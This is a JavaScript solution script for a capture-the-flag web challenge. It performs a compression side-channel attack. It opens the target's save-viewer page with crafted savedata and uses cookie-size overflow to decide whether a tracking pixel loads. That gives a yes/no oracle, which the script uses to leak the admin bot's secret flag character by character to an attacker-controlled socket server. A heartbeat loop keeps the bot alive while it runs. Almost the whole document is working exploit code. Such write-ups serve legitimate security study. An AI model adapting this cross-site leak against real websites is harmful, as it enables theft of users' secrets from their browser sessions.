import { io } from "https://cdn.socket.io/4.7.4/socket.io.esm.min.js"
import { compress } from "./compress.js"
import exflag from "./exflag.js"

const BISCUIT_URL = "https://biscuit-of-totality.chall.lac.tf"
const PIXEL = window.location + "/pixel.gif"
const SUS_TIMEOUT = 1500

// Get notified whenever our pixel.gif is loaded
const socket = io()
let cachedSus = false
let susPromiseResolve = null
socket.on("sus", () => {
  console.log(`[${new Date().toUTCString()}] sus`)
  cachedSus = true
  if (susPromiseResolve) {
    let temp = susPromiseResolve
    susPromiseResolve = null
    temp()
  }
})

async function log() {
  console.log(...arguments)
  socket.emit("log", JSON.stringify([...arguments]))
  return arguments[0]
}

const defaultSavedata = {
  hasSavedata: 1,
  biscuits: 0,
  farmers: 0,
  bakeries: 0,
  fireFlowers: 0,
  waterFlowers: 0,
  earthFlowers: 0,
  skyFlowers: 0,
  manaFlowers: 0,
  elvenFlowers: 0,
  gaiaFlowers: 0,
  gaiaIIFlowers: 0,
  tinyPotatoes: [],
  userpfp: "",
}

// Our binary oracle: views our loaded savedata and reports if the pixel was pinged!
// When the tinyPotatos cookie is too long, the addFlag function (ironically) will
// fail to run, thus causing all code execution to stop and not loading our pixel. 
async function isSus(tinyPotatoes, userpfp) {
  const combinedSavedata = structuredClone(defaultSavedata)
  combinedSavedata.tinyPotatoes = tinyPotatoes
  combinedSavedata.userpfp = userpfp + "?cloudflare_cringe=" + Date.now()
  const iframe = window.open(`${BISCUIT_URL}/viewSave#${encodeURIComponent(JSON.stringify(combinedSavedata))}`, "_blank")
  cachedSus = false
  try {
      await Promise.race([
        new Promise((res, _rej) => cachedSus ? (cachedSus = false, res()) : susPromiseResolve = res),
        new Promise((_res, rej) => setTimeout(rej, SUS_TIMEOUT))
      ])
      return true
  } catch (e) {
    return false
  } finally {
    iframe.close()
  }
}

// heartbeat to prevent admin bot from stopping
let done = false
;(async () => {
  while (!done) {
    try {
      await fetch(window.location + "/spinlock")
    } catch {}
  }
})()

log("starting!")
if (await isSus([], PIXEL)) {
  log(`pixel working with timeout ${SUS_TIMEOUT}!`)
} else {
  throw log(`pixel binary oracle didn't work; check SUS_TIMEOUT=${SUS_TIMEOUT}`)
}

// To abuse the compression side channel, we'll need "incompressible" strings
// that compress to around 4096 bytes. The below numbers for randomly generating
// these strings were chosen fairly arbitrarily and emperically.
function splitmix32(a) {
  return function() {
    a |= 0; a = a + 0x9e3779b9 | 0;
    var t = a ^ a >>> 16; t = Math.imul(t, 0x21f0aaad);
        t = t ^ t >>> 15; t = Math.imul(t, 0x735a2d97);
    return ((t = t ^ t >>> 15) >>> 0) / 4294967296;
  }
}
// Pick "letters" for garbage data that are unlikely to be actually in the flag
// and that will not get escaped by the JSON stringifier
const charset = " !#$%&'()*+./:;<=>?`~".split('')
function randomString(rng, len) {
  const chars = new Array(len)
  for (let i = 0; i < len; i++) {
    chars[i] = charset[Math.floor(rng() * charset.length)]
  }
  return chars.join('')
}
const rng = splitmix32(0x69421)

// We choose bounds on garbage generation such that
// the compressed strings are slightly under 4096 chars,
// aka the max cookie size. This needs to be figured out
// experimentally (and will probably take a few admin bot
// requests to do so...)
//
// Since DEFLATE can be a bit finicky we use multiple strings
// when looking for the least-most-incompressible one.
const incompressibles = {}
for (let i = 3440; i >= 3430; i -= 2) {
  for (let j = 0; j < 8; j++) {
    const rand = randomString(rng, i)
    const compLen = (await compress(rand)).length
    if (incompressibles[compLen]) {
      incompressibles[compLen].push(rand)
    } else {
      incompressibles[compLen] = [rand]
    } 
  }
}
const icLengths = Object.keys(incompressibles).map(x => Number(x))
const longestIC = Math.max(...icLengths)
const shortestIC = Math.min(...icLengths)
log(shortestIC, longestIC)

let largestCompressible = null
let largestCompressibleI = null
let sus = false
for (let i = /* longestIC */ 3916; i >= shortestIC; i -= 2) {
  if (!incompressibles[i]) {
    log(`warn: no incompressibles of len ${i}`)
    continue
  }
  for (let j = 0; j < incompressibles[i].length; j++) {
    // Make sure that every alphabetical letter is used in our test string
    // to allevate some Huffman quirks with newly seen symbols.
    sus = await isSus(["bdeghijkmnopqrsuvwxyzlactf{}", incompressibles[i][j]], PIXEL)
    if (sus) {
      largestCompressible = incompressibles[i][j]
      largestCompressibleI = i
      break
    }
  }
  if (sus) break
}
if (!largestCompressible) {
  throw "Couldn't find largest compressible tater"
} else {
  log(`Found largest compressible ${largestCompressibleI}`)
}

// debugging
window.largestCompressible = largestCompressible
window.rng = rng
window.randomString = randomString
window.compress = compress

// Side-channel a flag!
let flag = await exflag(
  log,
  async flag => {
    return await isSus(["bdeghijkmnopqrsuvwxyz" + flag + "}", largestCompressible], PIXEL)
  },
  "lactf{",
  "a-zA-Z0-9_}"
)
log(flag)
done = true
